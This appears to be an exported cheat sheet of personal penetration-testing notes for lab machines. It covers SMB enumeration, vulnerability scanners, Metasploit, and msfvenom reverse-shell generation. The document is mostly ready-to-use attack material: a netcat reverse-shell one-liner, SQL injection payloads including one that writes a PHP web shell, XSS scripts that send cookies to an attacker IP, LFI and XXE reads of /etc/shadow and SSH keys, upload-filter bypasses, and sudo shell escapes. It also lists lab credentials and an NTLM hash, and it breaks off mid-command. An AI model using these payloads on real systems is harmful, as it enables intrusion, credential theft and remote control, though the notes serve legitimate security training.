level-2'>ffuf</h1><br/><strong><span style="color:#0000ff;">FFUF</span></strong><br /><strong>ffuf</strong> <strong>-w</strong> common.txt<strong> -u </strong>http://10.10.10.175/FUZZ  <br /></div><div class='page'><h1 class='title level-2'>padburster</h1><br/><strong><span style="color:#0000ff;">PADBURSTER</span></strong>			(oracle)<br /><strong>padbuster</strong> <strong>http://10.10.10.18/index.php</strong> DRTqVRXRuA59SgnBs9mrkm%2BVnKuJdelb <strong>8</strong> <strong>-cookies</strong> <strong>auth</strong>=DRTqVRXRuA59SgnBs9mrkm%2BVnKuJdelb<br />padbuster http://10.10.10.18<strong>/index.php</strong> DRTqVRXRuA59SgnBs9mrkm%2BVnKuJdelb <strong>8</strong> <strong>-cookies auth</strong>=DRTqVRXRuA59SgnBs9mrkm%2BVnKuJdelb <strong>-plaintext user=admin</strong><br /></div><div class='page'><h1 class='title level-1'>SMB</h1><br/><strong><span style="color:#ff0000;">SMB   												(port 445)</span></strong><br /><strong><span style="color:#0000ff;">#config</span></strong><br />/etc/samba/<strong>smb.conf</strong><br /><br /><strong>#after edit</strong><br /><strong>systemctl restart smbd     </strong>																									<br /></div><div class='page'><h1 class='title level-2'>smbclient</h1><br/><strong><span style="color:#0000ff;">SMBCLIENT   																				(port 445) </span></strong></div><div class='page'><h1 class='title level-3'>list shares</h1><br/><strong><span style="color:#0000ff;">#LIST SHARES</span></strong><strong> </strong><br /><strong>smbclient -L </strong>//10.10.10.100										<strong>#-L = list smb shares</strong><br /><strong><span style="color:#0000ff;">#given user</span></strong><br /><strong>smbclient</strong> <strong>-L</strong> //10.10.10.149<strong> -U hazard</strong><br /><br /><strong><span style="color:#0000ff;">#null authentication</span></strong> (null session)<br /><strong>smbclient -L </strong>//10.10.10.175<strong> -U &#39;&#39; -N  <br /></strong><strong><span style="color:#0000ff;">#no password</span></strong><br /><strong>smbclient -L </strong>//10.10.10.175<strong> -N  								#-N = no-pass</strong></div><div class='page'><h1 class='title level-3'>connect</h1><br/><strong><span style="color:#0000ff;">#CONNECT TO SHARE 																				(found after list)</span></strong><br /><strong><span style="color:#0000ff;">#anonymous share</span></strong><br /><strong>smbclient</strong> //10.10.245.98/<strong>anonymous  	<br /><br /></strong><strong><span style="color:#0000ff;">#es: Backups share		</span></strong><strong>		</strong><br /><strong>smbclient -N </strong>//10.10.10.134/<strong>Backups</strong><br /><strong><span style="color:#0000ff;">#use password</span></strong><br /><strong>smbclient </strong>//10.10.157.78<strong>/backup -U svc-admin</strong><br />smbclient //10.10.163.96<strong>/secret</strong> <strong>-U suit</strong> <strong>-p 445</strong><br /><br />smbclient<strong> </strong>//10.10.207.205/<strong>profiles -U anonymous  						#ls</strong><br /></div><div class='page'><h1 class='title level-2'>mount</h1><br/><strong><span style="color:#0000ff;">MOUNT</span></strong> <br /><strong><span style="color:#0000ff;">#NFS share</span></strong><br />sudo<strong> mount -t nfs</strong> //10.10.125.220<strong>:/home /mnt/smb</strong><br /><br /><strong><span style="color:#0000ff;">#Windows shares (CIFS)</span></strong><br />sudo <strong>mount</strong> <strong>-t cifs</strong> &#39;//10.10.10.192/<strong>profiles$</strong>&#39; <strong>/</strong>mnt/smb						<strong>#win/samba share (cifs file system)</strong><br />sudo mount<strong> -t cifs</strong> //10.10.10.134<strong>/Backups </strong>/mnt/smb  <br /><strong>#given usn/psw</strong><br />sudo mount -<strong>t cifs -o</strong> <strong>&#39;username=</strong>Audit2020,<strong>password=</strong>prova123!<strong>&#39;</strong> //10.10.10.192/<strong>forensic</strong> /mnt<br />sudo mount -<strong>t cifs -o</strong> <strong>&#39;user=</strong>r.thompson,<strong>password=</strong>rY4n5eva&#39; //10.10.10.182/<strong>Data</strong> /mnt<br /><br /><strong><span style="color:#4d4d4d;">#VHD</span></strong><strong><span style="color:#0000ff;">            </span></strong><strong> </strong>#read only<br /><strong>7z l</strong> 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     																						#listing<br /><strong>guestmount -add</strong> 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd<strong> --inspector --ro -v </strong>/mnt/vhd <strong>   </strong> <br /><br /><br /><strong><span style="color:#0000ff;">#unmount</span></strong><br />sudo<strong> umount /mnt</strong>									<strong>	#-l=force  </strong><br /><br />***similar to <strong>smbclient //10.10.10.182/</strong>Data<strong> -U </strong>s.smith 							#mounts a share from smbclient</div><div class='page'><h1 class='title level-2'>smbmap</h1><br/><strong><span style="color:#0000ff;">SMBMAP</span></strong><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />  <br /> <br />  <br /><br /><br /></div><div class='page'><h1 class='title level-3'>list shares</h1><br/><strong><span style="color:#0000ff;">LIST SHARES  </span></strong><br /><strong>smbmap</strong> <strong>-H</strong> 10.10.221.120 <strong><span style="color:#0000ff;"> 								#read only/ read,write<br /></span></strong><strong><span style="color:#0000ff;">#blank usn/psw</span></strong><br /><strong>smbmap -H</strong> 10.10.10.175 <strong>-u &#39;&#39; -p &#39;&#39; </strong>    								#to bypass locks<br /><strong><span style="color:#0000ff;">#guest</span></strong><br /><strong>smbmap</strong> <strong>-H</strong> 10.10.10.134 <strong>-u</strong> anonymous   </div><div class='page'><h1 class='title level-3'>list content</h1><br/><strong><span style="color:#0000ff;">LIST CONTENT 	</span></strong><strong><span style="color:#000000;">	</span></strong><strong><span style="color:#4d4d4d;">that user can access</span></strong><br /><strong><span style="color:#0000ff;">#-R=directory</span></strong><br /><strong>smbmap -R </strong>Replication<strong> -H </strong>10.10.10.100<br /><strong><span style="color:#0000ff;">#usn/psw</span></strong><br /><strong>smbmap -H 10.10.10.182 -u </strong>r.thompson<strong> -p </strong>&#39;rY4n5eva&#39;<strong> -R </strong>Data							<br /><strong><span style="color:#0000ff;">#hash</span></strong><br /><strong>smbmap -u </strong>L4mpje<strong> -p </strong>&#39;aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9&#39;<strong> -H </strong>10.10.10.134<br /><strong><span style="color:#0000ff;">#recursive</span></strong><br /><strong>smbmap</strong> <strong>-H</strong> 10.10.221.120 <strong>-R</strong> <strong>--depth 5 </strong>  																#<strong>recursivelly</strong> shows also files<br /><strong><span style="color:#0000ff;">#execute command</span></strong><br /><strong>smbmap</strong> -<strong>u </strong>&quot;admin&quot;<strong> -p</strong> &quot;password&quot;<strong> -h </strong>10.10.10.10 <strong>-x </strong>&quot;ipconfig&quot;<br /><br /><strong>#search file</strong><br /><strong>smbmap -R </strong>Replication<strong> -H </strong>10.10.10.100 <strong>-A</strong> Groups.xml -q   							<strong>#finds given file</strong><br /><strong>#download file</strong><br /><strong>get</strong> id_rsa     </div><div class='page'><h1 class='title level-4'>domain</h1><br/><strong><span style="color:#0000ff;">DOMAIN</span></strong>																										<strong><span style="color:#0000ff;"> </span></strong> <br /><strong>smbmap -d </strong>QUERIER<strong> -u </strong>mssql-svc<strong> -p </strong>corporate568<strong> -H</strong> 10.10.10.125        									<strong>#-d=domain</strong>				<strong><span style="color:#4d4d4d;">#find open SMB port</span></strong><span style="color:#4d4d4d;"> </span><strong><span style="color:#4d4d4d;">given a share </span></strong><br /><strong>smbmap</strong> <strong>-d </strong>active.htb -<strong>u </strong>SVC_TGS<strong> -p </strong>GPPstillStandingStrong2k18 <strong>-H </strong>10.10.10.100 	<br /><strong>smbmap</strong> <strong>-d </strong>megabank.local -<strong>u </strong>melanie<strong> -p </strong>&#39;Welcome123!&#39; <strong>-H </strong>10.10.10.169  								#also with directory<strong> -R Users</strong></div><div class='page'><h1 class='title level-2'>smbget</h1><br/><strong><span style="color:#0000ff;">SMBGET</span></strong><br /><strong>smbget -R smb:</strong>//10.10.221.120/anonymous<span style="color:#ff0000;background-color:#ffff00;">   </span>#download files</div><div class='page'><h1 class='title level-2'>enum4linux</h1><br/><strong><span style="color:#0000ff;">ENUM4LINUX (SMB)</span></strong><br /><strong>enum4linux -a </strong>10.10.163.96  <strong>  							#all enumerations</strong><br /><strong>enum4linux</strong> <strong>-U -S</strong> 10.10.163.96    						<strong>#U= userlist, S= sharelist</strong><br /></div><div class='page'><h1 class='title level-1'>vulnerability assessment</h1><br/><strong><span style="color:#0000ff;">QUALYS</span></strong> <br /><strong><span style="color:#0000ff;">OPENVAS</span></strong><br /></div><div class='page'><h1 class='title level-2'>nikto</h1><br/><strong><span style="color:#0000ff;">NIKTO</span></strong><br /><strong>nikto -h </strong>http://10.10.10.14/<br /><strong>nikto</strong> <strong>-h </strong>10.10.24.86 <strong>-Plugins outdated </strong>   												#list of <strong>plugins to run</strong><br />nikto -h 10.10.24.86 -<strong>id </strong>admin.PrettyAwesomePassword1234 					#host <strong>authentication(usn:psw)</strong><br />nikto -h http://10.10.162.27:1234/manager/html <strong>-id</strong> bob<strong>:</strong>bubbles<br /></div><div class='page'><h1 class='title level-2'>owasp zap</h1><br/><strong><span style="color:#0000ff;">OWASP ZAP (app)</span></strong></div><div class='page'><h1 class='title level-2'>wpscan</h1><br/><strong><span style="color:#0000ff;">WPSCAN</span></strong><br /><strong>wpscan</strong> http://10.10.108.79/<br /><strong>wpscan --url </strong>http://internal.thm/blog<strong> -e u</strong>    																			<strong>#-e=enumurate			username </strong><br /><strong>wpscan --url </strong>http://10.10.10.37/<strong> -e u,ap,tt,t</strong>																			<strong>#all plugins</strong>, <strong>themes</strong><br /><strong>wpscan --url</strong> http://internal.thm/blog <strong>--usernames</strong> admin <strong>--passwords</strong> rockyou.txt			<strong>#login bruteforcing</strong><br /><br /><strong><span style="color:#0000ff;">#detection-mode </span></strong><br /><strong>wpscan --url</strong> http://spectra.htb/main/ <strong>--detection-mode aggressive -e ap</strong>						<strong>#all plugins</strong><br /><strong><span style="color:#0000ff;">#plugins-detection</span></strong> <br /><strong>wpscan --url</strong> http://spectra.htb/main/ <strong>--plugins-detection aggressive -e ap</strong><br /><br /></div><div class='page'><h1 class='title level-2'>joomscan</h1><br/><strong><span style="color:#0000ff;">JOOMSCAN</span></strong><br /><strong>joomscan --url </strong>http://10.10.10.150<strong> </strong>-ec<br /></div><div class='page'><h1 class='title level-2'>nessus</h1><br/><strong><span style="color:#0000ff;">NESSUS</span></strong><br />sudo /bin/systemctl start <strong>nessusd.service</strong></div><div class='page'><h1 class='title level-1'>exploitation</h1><br/></div><div class='page'><h1 class='title level-2'>searchsploit</h1><br/><strong><span style="color:#0000ff;">SEARCHSPLOIT</span></strong><br /><strong>searchsploit</strong> cms made simple 2.2.8<br /> <br /><strong><span style="color:#0000ff;">#read exploit</span></strong><br /><strong>searchsploit</strong> <strong>-x</strong> 11746.txt <br /><strong><span style="color:#0000ff;">#copy exploit</span></strong><strong> </strong><br /><strong>searchsploit -m </strong>php/webapps/47691.sh  <br /><strong><span style="color:#0000ff;">#update db</span></strong><br /><strong>searchsploit -u     </strong><br /><br />  <br /></div><div class='page'><h1 class='title level-2'>metasploit</h1><br/><strong><span style="color:#0000ff;">METASPLOIT</span></strong><br /><strong>msfconsole</strong><br /><strong>search</strong> multi/handler     <br /><strong>use 6</strong><br /><strong>show options</strong><br />set <strong>RHOSTS</strong> 10.10.129.121<br />set <strong>RPORT</strong> 80<br /><br /><strong><span style="color:#0000ff;">#payload example</span></strong><br /><strong>msfconsole</strong><br />use <strong>multi/handler</strong><br />set <strong>PAYLOAD</strong> <strong>linux</strong>/x86/meterpreter/<strong>reverse_tcp</strong><br />set <strong>LHOST</strong> 10.9.35.106<br />set <strong>LPORT</strong> 443<br /><strong>exploit -j  																			#listener in background</strong><br /> <br />  <br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>sessions</h1><br/><strong><span style="color:#0000ff;">SESSIONS</span></strong><br /><strong>sessions</strong><br /><strong>sessions -i 1  						#foreground session </strong><br />shell<br /></div><div class='page'><h1 class='title level-3'>meterpreter</h1><br/><strong><span style="color:#0000ff;">Meterpreter  </span></strong>													#directory <strong>/var/www/html</strong><br /><strong>shell</strong><br /><strong>upload </strong>PowerUp.ps1<br /> --------------------------------------------------------------<br /><br />  <br /></div><div class='page'><h1 class='title level-3'>Burp intercept</h1><br/><strong><span style="color:#0000ff;">Burp intercept request</span></strong><br />show <strong>advanced options</strong><br />set <strong>Proxies</strong> http:127.0.0.1:<strong>8080  																	</strong>		#Burp port, intercept on<br />set<strong> ReverseAllowProxy true</strong><br />run</div><div class='page'><h1 class='title level-3'>payloads</h1><br/><strong><span style="color:#0000ff;">PAYLOADS</span></strong><br /> <strong><span style="color:#0000ff;">&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;  staged=/ stageless=_</span></strong><br /><strong><span style="color:#0000ff;">#stageless</span></strong><br /><strong> linux/x86/meterpreter_reverse_tcp          		</strong><br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">staged</span></strong><br /> <strong>linux/x86/meterpreter/reverse_tcp</strong></div><div class='page'><h1 class='title level-3'>shell to meterpreter</h1><br/><strong><span style="color:#0000ff;">Upgrade</span></strong><strong><span style="color:#0000ff;"> from SHELL to METERPRETER</span></strong><br />background<br />use post/multi/manage/<strong>shell_to_meterpreter</strong><br /><strong>set SESSION 1</strong><br /><strong>run</strong><br />sessions -i 1<br /><br />  </div><div class='page'><h1 class='title level-3'>exploit suggester</h1><br/><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">exploit_suggester</span></strong><br />bg<br /><strong>use post/multi/recon/local_exploit_suggester</strong><br />set SESSION 1<br />run<br /><strong>background</strong><br /></div><div class='page'><h1 class='title level-2'>msfvenom</h1><br/><strong><span style="color:#0000ff;">MSFVENOM</span></strong><br /><strong><span style="color:#0000ff;">#list all payloads</span></strong><br /><strong>msfvenom -l payloads    <br />    </strong><br /><strong><span style="color:#0000ff;">Shell         </span></strong><strong>           &lt;PAYLOAD&gt;               &lt;OPTIONS&gt;</strong><br /><strong>msfvenom</strong> -<strong>p</strong> <strong>cmd/unix/reverse_netcat</strong> <strong>LHOST</strong>=10.8.185.233 <strong>LPORT</strong>=8888 R<br /><br />echo &quot;<strong>mkfifo /tmp/umag; nc 10.8.185.233 8888 0&lt;/tmp/umag | /bin/sh &gt;/tmp/umag 2&gt;&amp;1; rm /tmp/umag</strong>&quot; &gt; script.sh<br /> <br /><strong><span style="color:#0000ff;">Reverse shell</span></strong><br /><strong>msfvenom -p linux/x64/shell_reverse_tcp</strong> <strong>LHOST</strong>=10.8.185.233 <strong>LPORT</strong>=4444 <strong>-f elf -o </strong>shell.elf<br /><strong>chmod +x</strong> shell.elf<br /></div><div class='page'><h1 class='title level-1'>web applications</h1><br/> <strong><span style="color:#ff0000;">WEB        </span></strong><strong><br /> #directory<br /> </strong><strong><span style="color:#0000ff;">/var/www/html</span></strong><br /></div><div class='page'><h1 class='title level-2'>sql injection</h1><br/><strong><span style="color:#0000ff;">BLIND COMMAND EXECUTION</span></strong><br /><strong><span style="color:#ff0000;">SQL INJECTION</span></strong><br /><strong>&#39;or true -- </strong> 								<strong>	-- breaks query     </strong><br /><strong>&#39;or 1=1 --      <br />&#39;or 1=1-- -</strong><br /><strong>&#39;or 1=1 #</strong><br /><br />  <br />10.10.10.143/room.php?cod<strong>=1 and 1=1-- -</strong><br />10.10.10.143/room.php?cod<strong>=1</strong> and<strong> 1=2</strong>-- -  								<strong>	#false</strong><br /><br /> <br />  <br /><br /><br />  <br /><br /><br />  <br /><br /><br />  <br />SELECT username,password FROM users WHERE username=&#39;<strong> &#39; or true -- </strong>and password=&#39;&#39;<br />?id=1&#39; AND<strong> (ascii(substr((select database()),1,1))) = 115 </strong>--+<br /><br /><strong>admin&#39; -- - </strong>    #username parameter<br /><strong>admin’ or ‘1’=’1 #</strong><br /><br />  <br /><br /></div><div class='page'><h1 class='title level-3'>col number</h1><br/><strong><span style="color:#0000ff;">Number of columns </span></strong><br />http://10.10.10.143/room.php?cod=1 <strong>order by 8   </strong>    								#<strong>null, </strong>table has <strong>7 columns</strong></div><div class='page'><h1 class='title level-3'>union based</h1><br/><strong><span style="color:#0000ff;">UNION-BASED </span></strong><strong>SQL injection</strong><br />http://10.10.10.143/room.php?cod=3 <strong>union</strong> <strong>select</strong> 1,2,3,4,5,6,<strong>7  </strong>												#same number of parameters of table<br />http://10.10.10.143/room.php?<strong>cod=9999 union select </strong>1,2,3,4,5,6,7 										#false statement<br />http://10.10.10.143/room.php?cod=9999 union <strong>select</strong> 1,<strong>database(),user()</strong>,4,5,6,7<br /><br /><strong><span style="color:#0000ff;">#LOAD FILE</span></strong><br />http://10.10.10.143/room.php?cod=-1 <strong>union select 1</strong>,(<strong>LOAD_FILE(&#39;/etc/passwd&#39;))</strong>,3,4,5,6,7       				#also <strong>php</strong></div><div class='page'><h1 class='title level-3'>DB-tables-Columns</h1><br/><strong><span style="color:#0000ff;">#DB version</span></strong><br />union select 1,2,(select <strong>@@version</strong>),4,5,6,7<br /><br /><strong><span style="color:#0000ff;">#DBs</span></strong><br />...union select 1,2,(select <strong>group_concat</strong>(<strong>SCHEMA_NAME</strong>) from <strong>Information_Schema.SCHEMATA</strong>),4,5,6,7<br /><br /><br /><strong><span style="color:#0000ff;">#Tables+Columns</span></strong><br />...union select 1,2,(select <strong>group_concat</strong>(<strong>TABLE_NAME</strong>,&quot;:&quot;,<strong>COLUMN_NAME</strong>) from <strong>Information_Schema.COLUMNS </strong>where <strong>TABLE_SCHEMA</strong> = <strong>&#39;hotel&#39;</strong>),4,5,6,7<br /><br /><br /><strong><span style="color:#0000ff;">#password hashes</span></strong><br />...union select 1,2,(select <strong>group_concat</strong>(<strong>host</strong>,&quot;:&quot;,<strong>user,</strong>&quot;:&quot;,<strong>password</strong>) from <strong>mysql.user</strong>),4,5,6,7<br /><br /><strong><span style="color:#0000ff;">#write file</span></strong><br />..union select 1,&#39;&lt;?php system($_REQUEST[&quot;<strong>exec</strong>&quot;]);?&gt;&#39;,3,4,5,6,7<strong> INTO OUTFILE </strong>&#39;/var/www/html/<strong>shell.php</strong>&#39;</div><div class='page'><h1 class='title level-3'>username/password</h1><br/><strong><span style="color:#0000ff;">#username</span></strong><br />GET /support/?v=view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]=6 and <strong>(select username from staff limit 0,1) = &#39;admin&#39;-- -   </strong>					 <strong>#change to invalid user to check</strong><br /><br /><strong><span style="color:#0000ff;">#password</span></strong><br />GET /support/?v=view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]=6 and <strong> substr((select password from staff limit 0,1),1,1) = &#39;d&#39;-- -  			#check psw char by char</strong></div><div class='page'><h1 class='title level-2'>sqlmap</h1><br/><strong><span style="color:#0000ff;">SQLMAP</span></strong><br /><strong>sqlmap</strong> -u <a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a><br />sqlmap -u http://10.10.252.80/?msg=1 <strong>--dbms mySQL</strong> <strong>--batch</strong> <strong>--dump</strong>									<strong>#dump all DB, batch=accept automatically</strong><br /><strong>sqlmap</strong> --url http://tbfc.net/login.php<strong> --tables –columns</strong><br /><br /><strong><span style="color:#0000ff;">#forms</span></strong><br /><strong>sqlmap -u </strong>http://10.10.29.207/register.php <strong>--forms</strong></div><div class='page'><h1 class='title level-3'>burpsuite request</h1><br/><strong><span style="color:#0000ff;">#Burp Suite .req</span></strong><br /><strong>sqlmap -r login.req	</strong>													#<strong>-r</strong> = request intercepted with burpsuite<br /><strong>sqlmap -r </strong>login.req <strong>--batch</strong><br /><br /><strong>sqlmap -r </strong>req.txt <strong>--dbms=mysql --dump  </strong>																							<br /><strong>sqlmap -r </strong>req.txt<strong> --dbms sqlite	 -batch --tamper=space2comment  --dump-all </strong>														<strong>#tamper=WAF evasion, dump all tables</strong><br /><br /><strong><span style="color:#0000ff;">#tables</span></strong><br /><strong>sqlmap</strong> <strong>-r</strong> req.txt<strong> -p </strong>username<strong> --dbms=mysql --level=5 --risk=3 </strong>--drop-set-cookie <strong>-D </strong>admin<strong> --tables</strong>					<strong>#D=database name</strong><br /><br /><strong>sqlmap -r </strong>login.req<strong> --dbms mysql --batch --dump --level=5 --risk=3</strong><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>full path</h1><br/><strong><span style="color:#0000ff;">#DB</span></strong><br /><strong>sqlmap -r </strong>req.txt <strong>--current-db</strong><br /><strong><span style="color:#0000ff;">#tables</span></strong><br />sqlmap <strong>-r</strong> req.txt <strong>-D</strong> social <strong>--tables</strong><br /><strong><span style="color:#0000ff;">#columns</span></strong><br />sqlmap <strong>-r</strong> req.txt <strong>-D</strong> social <strong>-T</strong> users<strong> --columns</strong><br /><strong><span style="color:#0000ff;">#query </span></strong><br />sqlmap <strong>-r</strong> req.txt <strong>-D</strong> social<strong> -T</strong> users <strong>-C</strong> id,password,email,username<strong> --sql-query </strong>&quot;select id,password,email,username from users where username like &#39;%santa%&#39;&quot;        					#run <strong>query</strong><br /></div><div class='page'><h1 class='title level-2'>cross site scripting (XSS)</h1><br/><strong><span style="color:#ff0000;">XSS</span></strong><br /><strong><span style="color:#0000ff;">#images</span></strong><br />&lt;<strong>img src</strong>=&#39;LINK&#39; onmouseover=&quot;alert(&#39;<strong>xss</strong>&#39;)&quot;&gt;    	<br /><strong>&lt;img src=x onerror=alert(&#39;XSS&#39;);&gt;</strong><br />&lt;<strong>iframe src</strong>=&quot;javascript:alert(`<strong>xss</strong>`)&quot;&gt;<br /><br /><strong><span style="color:#0000ff;">#script</span></strong><br />&lt;script&gt;<strong>alert(document.cookie)</strong>&lt;/script&gt;<br />&lt;script&gt;<strong>alert(window.location.hostname)</strong>&lt;/script&gt;   																		#ip host<br />&lt;script&gt;document.getElementById(&#39;thm-title&#39;).innerHTML=&quot;I am a hacker&quot;;&lt;/script&gt;<br /> <br /> <br /> <br /> <br /> <br /><a href="http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html">http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html</a> 						#keylogger<br /><a href="http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html">http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html</a>  							#port scanning<br /> <br /> <br /> <br /><br /></div><div class='page'><h1 class='title level-3'>steal cookie</h1><br/><strong><span style="color:#0000ff;">#Steal cookie</span></strong><br />&lt;script&gt;<strong>document</strong>.<strong>location</strong>=&#39;<a href="http://10.10.78.220/log/'+document.cookie">http://10.10.78.220/log/&#39;+document.cookie</a>&lt;/script&gt;  							#log cookie<br />&lt;script&gt;<strong>window.location</strong>=&#39;<a href="http://10.8.185.233/?cookie='+document.cookie">http://10.8.185.233/?cookie=&#39;+document.cookie</a>&lt;/script&gt; 						#my ip, open netcat</div><div class='page'><h1 class='title level-2'>local file inclusion (LFI)</h1><br/><strong><span style="color:#ff0000;">LOCAL FILE INCLUSION (LFI)</span></strong>																	<br /><span style="color:#4d4d4d;">http://10.10.194.168/home?page=../../../../</span><strong><span style="color:#4d4d4d;">etc/passwd</span></strong>																							<strong>#encode all file paths</strong><br />http://10.10.79.236/get-file/../../../<strong>etc/shadow</strong><br />http://10.10.253.185/?view=./dog../../../../../../../../<strong>etc/passwd</strong><br />http://10.10.253.185/?view=./dog../../../../../../../../var/log<strong>/apache2/access.log</strong><br />http://10.10.104.142/get-file/../../../<strong>home/charlie/flag1.txt</strong><br /><br /><br />&lt;?php system($_GET[&#39;lfi&#39;]) ?&gt;<br /> <br /><br /> <br /><br /></div><div class='page'><h1 class='title level-3'>php wrapper</h1><br/><strong><span style="color:#ff0000;">PHP WRAPPER    </span></strong><br /><strong>php://filter/convert.base64-encode/resource</strong>=																	#to get php files without interpreting<br /> <br /><strong><span style="color:#0000ff;">#encode</span></strong><br />…&amp;pagename = <strong>php://filter/convert.base64-encode/resource</strong>=login<br />…&amp;pagename = <strong>php://filter/convert.base64-encode/resource</strong>=/var/www/html/<strong>db.php</strong><br />http://10.10.210.209/?view=<strong>php://filter/convert.base64-encode/resource=</strong>./dog../../index<br /> <br /><strong><span style="color:#0000ff;">#decode</span></strong><br /> <strong>echo -n </strong>dGVzdDJ2NGVyOWxsMSFzcw………..<strong> | base64 -d</strong><br /><br />  <br /></div><div class='page'><h1 class='title level-3'>file uploads</h1><br/><strong><span style="color:#0000ff;">FILE</span></strong><span style="color:#0000ff;"> </span><strong><span style="color:#0000ff;">UPLOAD</span></strong><br /><strong><span style="color:#0000ff;">EXTENSION</span></strong> <span style="color:#4d4d4d;">(server side)</span><br /><strong>shell.jpg.php   						#checks if extension is contained in the string</strong><br /></div><div class='page'><h1 class='title level-4'>MIME type</h1><br/><strong><span style="color:#0000ff;">MIME</span></strong><strong> </strong><strong><span style="color:#0000ff;">type</span></strong><strong> </strong><strong><span style="color:#0000ff;">(client-side) </span></strong><strong>														</strong>&lt;type&gt;/&lt;subtype&gt;<br /><strong>Content type: image/jpeg</strong><br /> <strong>  							text/php</strong></div><div class='page'><h1 class='title level-4'>magic bytes</h1><br/><strong><span style="color:#0000ff;">MAGIC BYTES</span></strong><br /><strong><span style="color:#0000ff;">#JPG</span></strong><br /><strong>head -c 20</strong> depeche-mode-violator.<strong>jpg </strong>| <strong>xxd</strong>			#see at screen<br /><strong>head -c 20</strong> depeche-mode-violator.jpg <strong>&gt; test</strong>		<strong>#copy content at start of file</strong><br /><br /><strong><span style="color:#0000ff;">#hexeditor</span></strong><br /><strong>hexeditor</strong> reverse_shell.php<br />#change number with magic number for new extension: <br /><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a><br />JPEG: <strong>FF D8 FF DB</strong><br /><br /><br /><strong><span style="color:#0000ff;">#letters</span></strong><br /><strong>GIF8;</strong><br />&lt;?php system($_REQUEST[&#39;ippsec&#39;]); ?&gt;<br /> <br />  <br /></div><div class='page'><h1 class='title level-4'>poison null byte</h1><br/><strong><span style="color:#0000ff;">Poison Null Byte</span></strong><br /><a href="http://10.10.58.25/ftp/package.json.bak%2500.md">http://10.10.58.25/ftp/package.json.bak</a><a href="http://10.10.58.25/ftp/package.json.bak%2500.md">%2500.md</a><strong>       #%2500 encodes </strong>in url the <strong>%00, </strong>then add allowed extension<br /><strong>shell.php%00.jpg  																#null byte</strong><br /><strong>shell.php\x00.jpg</strong><br /> </div><div class='page'><h1 class='title level-2'>cross site request forgery</h1><br/></div><div class='page'><h1 class='title level-2'>xml external entity</h1><br/><strong><span style="color:#0000ff;">XXE</span></strong><br />&lt;?xml version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE root [&lt;!ENTITY <strong>test</strong> <strong>SYSTEM</strong> <strong>&#39;</strong>file:<strong>///etc/passwd&#39;</strong>&gt;]&gt;<br />&lt;root&gt;<strong>&amp;test;</strong>&lt;/root&gt;<br /><br />&lt;?xml version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE root [&lt;!ENTITY <strong>test</strong> <strong>SYSTEM</strong> &#39;file:<strong>////home/falcon/.ssh/id_rsa</strong>&#39;&gt;]&gt;<br />&lt;root&gt;<strong>&amp;test</strong>;&lt;/root&gt;<br /> <br /><br />var xml = `&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br />&lt;!DOCTYPE foo [ &lt;!ENTITY <strong>xxe</strong> <strong>SYSTEM</strong> <strong>&quot;file:///etc/passwd&quot;</strong>&gt; ]&gt;<br />         &lt;bugreport&gt;<br />         &lt;title&gt;<strong>&amp;xxe</strong>;&lt;/title&gt;<br />         &lt;cwe&gt;something&lt;/cwe&gt;<br />         &lt;cvss&gt;something&lt;/cvss&gt;<br />         &lt;reward&gt;something&lt;/reward&gt;<br />        &lt;/bugreport&gt;`<br /></div><div class='page'><h1 class='title level-1'>privilege escalation</h1><br/><br /> <br /> 2) Locating other services running or <strong>applications</strong> installed that may be <strong>abusable</strong> (<strong>SUID</strong> &amp; <strong>out of date software</strong>)<br /> <br /><br /> <br /> 4) <strong>Credentials</strong> (<strong>user accounts,</strong> application config files..)<br />5) <strong>Mis-configured</strong> file and directory <strong>permissions</strong><br /></div><div class='page'><h1 class='title level-2'>whoami + id</h1><br/><strong>whoami</strong><br /><strong>id   </strong>#see if we have root privileges</div><div class='page'><h1 class='title level-2'>GTFOBins</h1><br/><strong><span style="color:#0000ff;">GTFOBins</span></strong><br /><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br /><br />(search sudo)</div><div class='page'><h1 class='title level-3'>awk</h1><br/><strong><span style="color:#0000ff;">AWK</span></strong><br />sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;   </div><div class='page'><h1 class='title level-3'>nano</h1><br/><strong><span style="color:#0000ff;">NANO</span></strong><br />sudo find /bin -name nano -exec /bin/sh \;  </div><div class='page'><h1 class='title level-3'>vim</h1><br/><strong><span style="color:#0000ff;">VIM</span></strong><br />sudo vim -c &#39;:!/bin/sh&#39;      </div><div class='page'><h1 class='title level-3'>python</h1><br/><strong><span style="color:#0000ff;">PYTHON</span></strong><br />sudo python -c &#39;import os; os.system(&quot;/bin/bash&quot;)&#39;</div><div class='page'><h1 class='title level-3'>nmap</h1><br/><strong><span style="color:#0000ff;">NMAP</span></strong><br />echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse </div><div class='page'><h1 class='title level-3'>apache</h1><br/><strong><span style="color:#0000ff;">APACHE</span></strong><br />sudo apache2 -f /etc/shadow   </div><div class='page'><h1 class='title level-2'>executable commands</h1><br/><strong><span style="color:#0000ff;">EXECUTABLE COMMANDS</span></strong><br /><strong>sudo -l</strong><br /><br /><strong><span style="color:#0000ff;">#run program with user permission</span></strong><br /><strong>sudo -u </strong>john<strong> /bin/bash  										</strong><br /><strong>sudo -u 